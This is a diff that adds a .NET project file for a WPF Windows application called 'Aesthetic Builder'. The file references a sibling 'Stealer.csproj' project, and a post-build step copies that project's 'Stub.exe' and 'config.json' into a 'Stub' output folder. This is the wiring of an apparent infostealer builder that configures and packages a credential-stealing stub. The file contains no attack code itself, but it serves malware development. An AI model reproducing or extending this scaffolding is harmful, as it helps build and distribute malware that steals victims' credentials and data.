@@ -1,0 +1,33 @@
+<Project Sdk="Microsoft.NET.Sdk">
+
+  <PropertyGroup>
+    <OutputType>WinExe</OutputType>
+    <TargetFramework>net8.0-windows</TargetFramework>
+    <UseWPF>true</UseWPF>
+    <ImplicitUsings>enable</ImplicitUsings>
+    <Nullable>disable</Nullable>
+    <AssemblyName>Aesthetic Builder</AssemblyName>
+    <NoWarn>$(NoWarn);NU1702</NoWarn>
+  </PropertyGroup>
+
+  <ItemGroup>
+    <!-- Иконки для вкладок -->
+    <Resource Include="inbox(1).png" />
+    <Resource Include="cogwheel.png" />
+    <Resource Include="crossed-hammers.png" />
+  </ItemGroup>
+
+  <ItemGroup>
+    <ProjectReference Include="..\Main\Stealer.csproj" ReferenceOutputAssembly="false" />
+  </ItemGroup>
+
+  <Target Name="CopyStub" AfterTargets="Build">
+    <ItemGroup>
+      <StubFiles Include="..\Main\bin\$(Configuration)\net462\Stub.exe" />
+      <ConfigFiles Include="..\Main\config.json" />
+    </ItemGroup>
+    <Copy SourceFiles="@(StubFiles)" DestinationFolder="$(TargetDir)Stub" SkipUnchangedFiles="true" />
+    <Copy SourceFiles="@(ConfigFiles)" DestinationFolder="$(TargetDir)Stub" SkipUnchangedFiles="true" />
+  </Target>
+
+</Project>
